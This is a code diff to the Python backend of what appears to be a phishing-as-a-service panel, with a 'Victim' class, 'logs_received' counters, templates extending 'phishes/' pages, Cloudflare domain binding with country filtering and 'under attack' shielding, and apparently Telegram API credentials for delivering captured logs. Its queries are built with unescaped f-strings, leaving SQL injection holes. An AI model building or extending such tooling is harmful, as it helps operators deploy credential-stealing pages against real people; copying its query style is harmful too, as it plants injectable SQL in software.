@@ -61,7 +61,9 @@ class User:
 
                 cursor.execute("""
                 CREATE TABLE "domains" (
+                    "id"	INTEGER NOT NULL UNIQUE,
                     "domain"	TEXT,
+                    "path"	TEXT,
                     "servers"	TEXT,
                     "template"	TEXT,
                     "status"	TEXT,
@@ -69,9 +71,12 @@ class User:
                     "redirect"	TEXT,
                     "redirect_on_success"	TEXT,
                     "countries"	TEXT,
-                    "views"	REAL DEFAULT 0,
-                    "logsReceived"	INTEGER DEFAULT 0,
-                    "created_on"	DATETIME
+                    "views"	INTEGER DEFAULT 0,
+                    "logs_received"	INTEGER DEFAULT 0,
+                    "created_on"	DATETIME,
+                    "app_id"	TEXT,
+	                "api_hash"	TEXT,
+                    PRIMARY KEY("id" AUTOINCREMENT)                               
                 );
                 """)
 
@@ -117,7 +122,7 @@ class Victim:
     def GetDomains(self):
         with SqliteDatabase(self.database_path) as conn:
             cursor = conn.cursor()
-            cursor.execute(f"SELECT * FROM domains")
+            cursor.execute(f"SELECT id, domain, path, servers, template, status, security, views, logs_received FROM domains")
             conn.commit()
             data = cursor.fetchall()
             return data
@@ -126,7 +131,7 @@ class Victim:
     def CheckDomain(self, domain):
         with SqliteDatabase(self.database_path) as conn:
             cursor = conn.cursor()
-            cursor.execute(f"SELECT * FROM domains WHERE domain = '{domain}'")
+            cursor.execute(f"SELECT domain FROM domains WHERE domain = '{domain}'")
             conn.commit()
             data = cursor.fetchall()
             return data
@@ -144,13 +149,7 @@ class Victim:
 
 
 
-
-
-
-
-
-
-    def AddDomain(self, domain, page, path, security, redirect, countries, redirect_on_success, username):
+    def AddDomain(self, domain, page, path, security, redirect, countries, redirect_on_success, username, app_id, api_hash):
         added_domain = clf.AddDomain(domain)
 
         if added_domain:
@@ -163,13 +162,10 @@ class Victim:
             with SqliteDatabase(self.database_path) as conn:
                 cursor = conn.cursor()
                 cursor.execute(f"""
-                    INSERT INTO domains(domain, servers, template, status, security, redirect, redirect_on_success, countries, created_on)
-                    VALUES('{domain+'/'+path}', '{ns_servers}', '{page}', '{status}', '{security}', '{redirect}', '{redirect_on_success}', '{countries_db}', '{datetime.utcnow()}')
+                    INSERT INTO domains(domain, path, servers, template, status, security, redirect, redirect_on_success, countries, created_on, app_id, api_hash)
+                    VALUES('{domain}', {path}, '{ns_servers}', '{page}', '{status}', '{security}', '{redirect}', '{redirect_on_success}', '{countries_db}', '{datetime.utcnow()}', '{app_id}', '{api_hash}')
                 """)
-                print(f"""
-                    INSERT INTO domains(domain, servers, template, status, security, redirect, redirect_on_success, countries, created_on)
-                    VALUES('{domain+'/'+path}', '{ns_servers}', '{page}', '{status}', '{security}', '{redirect}', '{redirect_on_success}', '{countries_db}', '{datetime.utcnow()}')
-                """)
+  
                 conn.commit()
                 mkdir(f"templates/domains/{domain}${path}/")
                 f = open(f"templates/domains/{domain}${path}/{username}.html", 'w')
@@ -179,10 +175,92 @@ class Victim:
                 if clf.BindDomain(zone_id, domain, server_ip):
                     clf.CountryFirewall(zone_id, countries)
                     if security == 'true':
-                        clf.SetUnderAttack(zone_id)
+                        clf.SetSecurityLevel(zone_id, 'under_attack')
                     return [True, 'Домен успешно добавлен']
                 else:
                     return [False, 'Что-то пошло не так, свяжитесь с админом']
         
         else:
             return [False, 'Этот домен добавлен уже добавлен другим пользователем, обратитесь в поддержку']
+        
+
+
+
+    def UpdateDomain(self, url, id):
+        domains = clf.getDomains()
+        for domain in domains:
+            if domain['name'] in url:
+                with SqliteDatabase(self.database_path) as conn:
+                    cursor = conn.cursor()
+                    cursor.execute(f"UPDATE domains SET status = '{domain['status']}' WHERE id = '{id}';")
+                    conn.commit()
+                    return [True, domain['status']]
+        return [False, None]
+    
+
+    def GetDomainInfo(self, id=None, domain=None):
+        with SqliteDatabase(self.database_path) as conn:
+            cursor = conn.cursor()
+            if domain == None:
+                cursor.execute(f"SELECT * FROM domains WHERE id = '{id}'")
+            else:
+                cursor.execute(f"SELECT * FROM domains WHERE domain = '{domain}'")
+            conn.commit()
+            data = cursor.fetchall()
+            return data
+
+
+    def EditDomain(self, domain, page, path, security, redirect, countries, redirect_on_success, username, app_id, api_hash):
+        try:
+            old_data = self.GetDomainInfo(domain=domain)
+            rmtree(f"templates/domains/{domain}${old_data[0][2]}")
+            countries_db = ', '.join(countries)
+            with SqliteDatabase(self.database_path) as conn:
+                cursor = conn.cursor()
+                cursor.execute(f"""UPDATE domains 
+                    SET template = '{page}',
+                    path = '{path}',
+                    security = '{security}',
+                    redirect = '{redirect}',
+                    countries = '{countries_db}',
+                    redirect_on_success = '{redirect_on_success}',
+                    app_id = '{app_id}',
+                    api_hash = '{api_hash}'
+                    WHERE domain = '{domain}';""")
+                conn.commit()
+
+                mkdir(f"templates/domains/{domain}${path}/")
+                f = open(f"templates/domains/{domain}${path}/{username}.html", 'w')
+                f.write("{% extends 'phishes/" + page + "/index.html' %}")
+                f.close()
+                zones = clf.getDomains()
+                for zone in zones:
+                    if zone['name'] == domain:
+                        clf.UpdateFilter(zone['id'], countries)
+                        if security == 'true':
+                            clf.SetSecurityLevel(zone['id'], 'under_attack')
+                        else:
+                            clf.SetSecurityLevel(zone['id'], 'medium')
+            return True
+        except Exception as e:
+            print(e)
+            return False
+
+
+    def RemoveDomain(self, domain):
+        try:
+            old_data = self.GetDomainInfo(domain=domain)
+            rmtree(f"templates/domains/{domain}${old_data[0][2]}")
+
+            with SqliteDatabase(self.database_path) as conn:
+                cursor = conn.cursor()
+                cursor.execute(f"DELETE FROM domains WHERE domain = '{domain}';")
+                conn.commit()
+                zones = clf.getDomains()
+                for zone in zones:
+                    if zone['name'] == domain:
+                        clf.RemoveDomain(zone['id'])
+
+            return True
+        except Exception as e:
+            return False
